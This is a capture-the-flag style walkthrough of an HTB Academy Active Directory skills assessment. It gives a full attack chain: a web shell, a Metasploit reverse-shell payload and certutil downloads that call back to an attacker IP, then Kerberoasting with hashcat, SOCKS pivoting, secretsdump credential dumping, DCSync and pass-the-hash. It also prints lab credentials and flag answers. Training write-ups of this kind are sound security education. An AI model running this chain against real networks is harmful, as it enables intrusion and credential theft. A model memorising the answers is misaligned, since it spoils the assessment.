# 🎯 **AD Enumeration & Attacks - Skills Assessment Part I**

## 🏆 **HTB Academy: Complete Assessment Walkthrough**

### 📍 **Overview**

**Skills Assessment Part I** provides a comprehensive practical evaluation of Active Directory enumeration and attack techniques learned throughout the HTB Academy module. This assessment covers the complete attack chain from initial web access to full domain compromise, incorporating pivoting, credential dumping, Kerberoasting, ACL abuse, and DCSync attacks.

**🎯 Assessment Scope**: 8 progressive questions demonstrating real-world AD penetration testing methodology.

---

## 🌐 **Question 1: Initial Web Access**

### **🎯 Task**: "Submit the contents of the flag.txt file on the administrator Desktop of the web server"

### **📋 Solution Steps:**

#### **Step 1: Discover Web Shell**
```bash
# Navigate to discovered upload directory
http://TARGET_IP/uploads/antak.aspx

# Credentials: admin:My_W3bsH3ll_P@ssw0rd!
```

#### **Step 2: Access First Flag**
```powershell
# In Antak web shell:
cat c:\users\administrator\desktop\flag.txt
```

**🎯 Answer**: `JusT_g3tt1ng_st@rt3d!`

---

## 🎫 **Question 2: Kerberoasting Discovery**

### **🎯 Task**: "Kerberoast an account with the SPN MSSQLSvc/SQL01.inlanefreight.local:1433 and submit the account name as your answer"

### **📋 Solution Steps:**

#### **Step 1: Establish Meterpreter Session**
```bash
# Setup web_delivery in msfconsole
sudo msfconsole -q
use exploit/multi/script/web_delivery
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.13  # Your HTB VPN IP
set SRVHOST 10.10.14.13
set TARGET 2
exploit

# Copy the generated PowerShell command and execute in Antak web shell
```

#### **Step 2: Migrate to Stable Process**
```bash
# In meterpreter:
ps
migrate 568  # winlogon.exe PID
getuid       # Verify NT AUTHORITY\SYSTEM
```

#### **Step 3: Download PowerView**
```bash
# On attacker machine:
wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
python3 -m http.server 8000

# In meterpreter:
shell
cd C:\
certutil.exe -f -urlcache -split http://10.10.14.13:8000/PowerView.ps1 PowerView.ps1
powershell
```

#### **Step 4: Enumerate SPNs**
```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -SPN | select samaccountname

# Results show multiple accounts:
# azureconnect, backupjob, krbtgt, sqltest, sqlqa, sqldev, svc_sql, sqlprod
```

**🎯 Answer**: `svc_sql`

---

## 🔑 **Question 3: Hash Cracking**

### **🎯 Task**: "Crack the account's password. Submit the cleartext value."

### **📋 Solution Steps:**

#### **Step 1: Extract Kerberos Hash**
```powershell
# In PowerShell session:
Get-DomainUser -identity svc_sql | get-domainspnticket -format hashcat

# Extract the hash from output (long $krb5tgs$23$ string)
```

#### **Step 2: Format Hash for Cracking**
```bash
# Remove whitespace and save to file:
echo '$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$[HASH_DATA]' | tr -d "[:space:]" > tgs_file
```

#### **Step 3: Crack with Hashcat**
```bash
# Crack TGS hash:
hashcat -m 13100 tgs_file /usr/share/wordlists/rockyou.txt

# Result: svc_sql:lucky7
```

**🎯 Answer**: `lucky7`

---

## 🌐 **Question 4: Lateral Movement**

### **🎯 Task**: "Submit the contents of the flag.txt file on the Administrator desktop on MS01"

### **📋 Solution Steps:**

#### **Step 1: Setup Pivoting Infrastructure**
```bash
# In meterpreter session:
run autoroute -s 172.16.6.0/24
background

# Setup SOCKS proxy:
use auxiliary/server/socks_proxy
set VERSION 4a  # or 5 depending on config
set SRVPORT 1080
run -j

# Verify proxy is running:
jobs
```

#### **Step 2: Configure Proxychains**
```bash
# Edit /etc/proxychains4.conf:
sudo nano /etc/proxychains4.conf

# Add to bottom:
[ProxyList]
socks4  127.0.0.1 1080
# or socks5 127.0.0.1 1080
```

#### **Step 3: Network Discovery**
```bash
# In msfconsole - scan internal network:
use auxiliary/scanner/portscan/tcp
set rhosts 172.16.6.0/24
set PORTS 139,445
set threads 50
run

# Results: 172.16.6.3, 172.16.6.50, 172.16.6.100 discovered
```

#### **Step 4: Access MS01 and Retrieve Flag**
```bash
# ⚠️ CrackMapExec may have issues with proxychains - use Impacket alternatives:

# Method 1: Try CrackMapExec (may fail with credential parsing issues)
proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 -x "type C:\users\administrator\desktop\flag.txt"

# Method 2: Use Impacket (RECOMMENDED - works better with proxychains)
proxychains impacket-smbexec INLANEFREIGHT/svc_sql:lucky7@172.16.6.50
# From shell:
type C:\users\administrator\desktop\flag.txt
```

**🎯 Answer**: `spn$_r0ast1ng_on_@n_0p3n_f1re`

---

## 👤 **Question 5: Credential Discovery**

### **🎯 Task**: "Find cleartext credentials for another domain user. Submit the username as your answer."

### **📋 Solution Steps:**

#### **Step 1: Dump LSA Secrets**
```bash
# ⚠️ CrackMapExec --lsa may fail with proxychains
# Try CrackMapExec first:
proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa

# Alternative: Use Impacket secretsdump (MORE RELIABLE):
proxychains impacket-secretsdump INLANEFREIGHT/svc_sql:lucky7@172.16.6.50

# Look for cleartext credentials in output
```

#### **Step 2: Identify Cleartext Credentials**
```
# Expected output includes:
INLANEFREIGHT.LOCAL/tpetty:$DCC2$10240#tpetty#685decd67a67f5b6e45a182ed076d801  # ← Hash
INLANEFREIGHT\tpetty:Sup3rS3cur3D0m@inU2eR  # ← CLEARTEXT!
```

**🎯 Answer**: `tpetty`

---

## 🔐 **Question 6: Password Extraction**

### **🎯 Task**: "Submit this user's cleartext password."

### **📋 Solution Steps:**

**From previous LSA secrets dump:**
```
INLANEFREIGHT\tpetty:Sup3rS3cur3D0m@inU2eR
```

**🎯 Answer**: `Sup3rS3cur3D0m@inU2eR`

---

## 🎯 **Question 7: Privilege Analysis**

### **🎯 Task**: "What attack can this user perform?"

### **📋 Solution Steps:**

#### **Step 1: Analyze tpetty Privileges**
```powershell
# In meterpreter PowerShell session:
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid tpetty
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

#### **Step 2: Identify DCSync Rights**
```
# Output shows:
AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
ObjectAceType         : DS-Replication-Get-Changes
ObjectAceType         : DS-Replication-Get-Changes-All
ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set
```

**🎯 Answer**: `DCSync`

---

## 👑 **Question 8: Domain Takeover**

### **🎯 Task**: "Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01"

### **📋 Solution Steps:**

#### **Step 1: DCSync Attack**
```bash
# ⚠️ CRITICAL: Use inline password format to avoid proxychains issues!

# FAILS - Interactive password prompt causes timeout:
proxychains sudo impacket-secretsdump INLANEFREIGHT/tpetty@172.16.6.3 -just-dc-user administrator

# WORKS - Inline credentials:
proxychains impacket-secretsdump INLANEFREIGHT/tpetty:Sup3rS3cur3D0m@inU2eR@172.16.6.3 -just-dc-user administrator

# Output:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0:::
```

#### **Step 2: Pass-the-Hash Attack**
```bash
# Use extracted hash to access DC01:
proxychains impacket-wmiexec administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0

# Verify domain controller access:
hostname  # Should show: DC01
```

#### **Step 3: Retrieve Final Flag**
```cmd
type c:\users\administrator\desktop\flag.txt
```

**🎯 Answer**: `r3plicat1on_m@st3r!`

---

## 🛠️ **Critical Troubleshooting Notes**

### **⚠️ CrackMapExec + Proxychains Issues**

**Problem**: CrackMapExec incorrectly parses credentials through proxychains:
```bash
# Shows this error:
[-] INLANEFREIGHT.LOCAL\$krb5tgs$23$*svc_sql$... STATUS_INVALID_PARAMETER
```

**Solution**: Use Impacket tools instead:
```bash
# Instead of: proxychains crackmapexec smb target -u user -p pass
# Use: proxychains impacket-smbexec DOMAIN/user:pass@target
```

### **🔧 Proxychains Best Practices**

#### **✅ Working Format**:
```bash
# Inline credentials (no interactive prompts):
proxychains impacket-secretsdump DOMAIN/user:pass@target

# No sudo with proxychains:
proxychains impacket-wmiexec user@target -hashes LM:NT
```

#### **❌ Problematic Format**:
```bash
# Interactive password prompts fail:
proxychains sudo secretsdump.py DOMAIN/user@target

# CrackMapExec credential parsing issues:
proxychains crackmapexec smb target -u user -p pass
```

### **🔌 SOCKS Proxy Stability**

#### **Common Issues**:
- SOCKS proxy stops automatically
- Port conflicts (1080 in use)
- VERSION mismatch between Metasploit and proxychains

#### **Solutions**:
```bash
# Check proxy status:
jobs

# Restart if needed:
use auxiliary/server/socks_proxy
set VERSION 4a  # Match proxychains config
set SRVPORT 1082  # Use different port if 1080 occupied
run -j

# Update proxychains accordingly:
# socks4  127.0.0.1 1082
```

---

## 🔑 **Complete Attack Chain Summary**

### **📊 Assessment Flow**:
```
Web Shell Access → Meterpreter Session → Network Pivoting → Kerberoasting → 
     ↓                    ↓                    ↓               ↓
Initial Flag        System Privileges    Internal Network   svc_sql Hash
     ↓                    ↓                    ↓               ↓
Credential Dumping → Cleartext Discovery → Privilege Analysis → Domain Takeover
     ↓                    ↓                    ↓               ↓
   MS01 Flag           tpetty User         DCSync Rights    Final Flag
```

### **🏆 Key Skills Demonstrated**:
- **Web Application Security**: Shell upload and execution
- **Post-Exploitation**: Meterpreter migration and persistence
- **Network Pivoting**: SOCKS proxy and routing configuration
- **Active Directory Enumeration**: PowerView and native tools
- **Kerberoasting**: SPN discovery and TGS extraction
- **Credential Extraction**: LSA secrets and autologon passwords
- **ACL Analysis**: Extended rights and privilege identification
- **DCSync Attacks**: DRSUAPI abuse for credential extraction
- **Pass-the-Hash**: Administrative access with NTLM hashes

### **🛡️ Defensive Lessons**:
- **Web Security**: Proper upload restrictions and validation
- **Credential Storage**: Avoid cleartext autologon passwords
- **Service Accounts**: Strong passwords and managed service accounts
- **ACL Management**: Regular audit of dangerous privileges (DCSync)
- **Network Segmentation**: Limit lateral movement capabilities
- **Monitoring**: Detection of Kerberoasting and DCSync activities

**🎯 This Skills Assessment demonstrates the complete AD attack methodology - from initial foothold to full domain compromise using practical techniques that work reliably in real-world scenarios!**

--- 